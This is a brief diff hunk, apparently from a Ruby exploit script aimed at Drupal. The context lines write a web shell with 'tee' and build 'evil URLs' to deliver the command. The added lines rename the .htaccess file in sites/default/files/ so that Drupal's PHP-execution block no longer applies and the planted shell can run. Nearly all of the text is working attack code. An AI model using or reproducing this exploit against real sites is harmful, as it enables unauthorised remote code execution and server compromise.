@@ -233,7 +233,12 @@ paths.each do|path|
 
   # Final command to execute
   cmd = "#{bashcmd} | tee #{webshellpath}"
-
+ 
+  # By default Drupal disables the PHP engine entirely in ./sites/default/files/
+  if path == paths.last
+    cmd += "; if [ -f #{path}.htaccess ]; then mv #{path}.htaccess #{path}.htaccess.pak; fi"
+  end
+ 
   # Generate evil URLs
   url, payload = gen_evil_url(cmd)
   # Make the request
